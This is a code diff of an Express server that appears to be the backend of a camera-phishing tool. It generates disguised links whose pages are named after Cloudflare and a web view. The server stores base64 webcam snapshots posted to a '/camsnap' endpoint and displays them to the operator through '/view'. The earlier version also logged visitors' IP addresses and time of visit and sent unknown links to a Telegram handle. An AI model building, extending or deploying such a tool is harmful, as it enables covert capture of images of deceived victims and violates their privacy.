@@ -1,89 +1,96 @@
 require('dotenv').config();
-const express = require("express");
+const fs = require('fs');
+const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
-const sequelize = require('./config/database');
-const Url = require('./models/Url');
+const { sequelize, URL } = require('./config/database');
 
 const app = express();
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(bodyParser.json({ limit: '20mb', type: 'application/json' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' }));
 app.use(cors());
-app.set("view engine", "ejs");
+app.set('view engine', 'ejs');
 
-const hostURL = process.env.HOST_URL || "YOUR_HOST_URL";
-const port = process.env.PORT || 5000;
+const PORT = process.env.PORT || 5000;
+const hostURL = process.env.HOST_URL || 'http://localhost';
 
-sequelize.sync()
-  .then(() => console.log('Database connected...'))
-  .catch(err => console.log('Database connection error:', err));
-
-app.post("/camsnap", async (req, res) => {
+app.get('/c/:path', async (req, res) => {
   try {
-    const { uid, img } = req.body;
-    const url = await Url.findOne({ where: { uniqueId: uid } });
-    if (url) {
-      url.imageData = img;
-      await url.save();
-      res.send("Done");
+    const entry = await URL.findOne({ where: { uniqueId: req.params.path } });
+    if (entry) {
+      res.render('cloudflare', { url: entry.redirectUrl, uid: req.params.path });
     } else {
-      res.status(404).send("Not Found");
+      res.redirect('https://your-redirect-url.com');
     }
   } catch (error) {
-    console.error("Error saving image:", error);
-    res.status(500).send("Server error");
+    res.status(500).send(error.message);
   }
 });
 
-app.get('/c/:id', async (req, res) => {
+app.get('/w/:path', async (req, res) => {
   try {
-    const id = req.params.id;
-    const url = await Url.findOne({ where: { uniqueId: id } });
-    if (url) {
-      res.render('cloudflare', { ip: req.ip, time: new Date(), url: url.redirectUrl, uid: id, imageData: url.imageData });
+    const entry = await URL.findOne({ where: { uniqueId: req.params.path } });
+    if (entry) {
+      res.render('webview', { url: entry.redirectUrl, uid: req.params.path });
     } else {
-      res.redirect("https://t.me/th30neand0nly0ne");
+      res.redirect('https://your-redirect-url.com');
     }
   } catch (error) {
-    console.error('Error retrieving URL:', error);
-    res.status(500).send("Server error");
-  }
-});
-
-app.get('/w/:id', async (req, res) => {
-  try {
-    const id = req.params.id;
-    const url = await Url.findOne({ where: { uniqueId: id } });
-    if (url) {
-      res.render('webview', { ip: req.ip, time: new Date(), url: url.redirectUrl, uid: id, imageData: url.imageData });
-    } else {
-      res.redirect("https://t.me/th30neand0nly0ne");
-    }
-  } catch (error) {
-    console.error('Error retrieving URL:', error);
-    res.status(500).send("Server error");
+    res.status(500).send(error.message);
   }
 });
 
 app.post('/generate', async (req, res) => {
+  const { originalUrl, redirectUrl } = req.body;
+  const uniqueId = Math.random().toString(36).substring(2, 8);
+
   try {
-    const { originalUrl, redirectUrl } = req.body;
-    const uniqueId = Math.random().toString(36).substring(7);
-    const url = new Url({ originalUrl, uniqueId, redirectUrl });
-    await url.save();
-    console.log('URL saved:', url);
+    const newURL = await URL.create({
+      originalUrl,
+      uniqueId,
+      redirectUrl,
+    });
 
-    const host = req.get('host');
-    const cloudflareUrl = `https://${host}/c/${uniqueId}`;
-    const webViewUrl = `https://${host}/w/${uniqueId}`;
-
-    res.json({ cloudflareUrl, webViewUrl });
+    res.json({
+      originalUrl: newURL.originalUrl,
+      uniqueId: newURL.uniqueId,
+      redirectUrl: newURL.redirectUrl,
+    });
   } catch (error) {
-    console.error('Error generating URL:', error);
-    res.status(500).send('Server error');
+    res.status(500).send(error.message);
   }
 });
 
-app.listen(port, () => {
-  console.log(`App Running on Port ${port}!`);
+app.post('/camsnap', async (req, res) => {
+  const { uid, img } = req.body;
+
+  try {
+    const entry = await URL.findOne({ where: { uniqueId: uid } });
+    if (entry) {
+      entry.imageData = img;
+      await entry.save();
+      res.send('Done');
+    } else {
+      res.status(404).send('Not found');
+    }
+  } catch (error) {
+    res.status(500).send(error.message);
+  }
+});
+
+app.get('/view/:uid', async (req, res) => {
+  try {
+    const entry = await URL.findOne({ where: { uniqueId: req.params.uid } });
+    if (entry) {
+      res.send(`<img src="data:image/png;base64,${entry.imageData}" />`);
+    } else {
+      res.status(404).send('Not found');
+    }
+  } catch (error) {
+    res.status(500).send(error.message);
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`App Running on Port ${PORT}!`);
 });
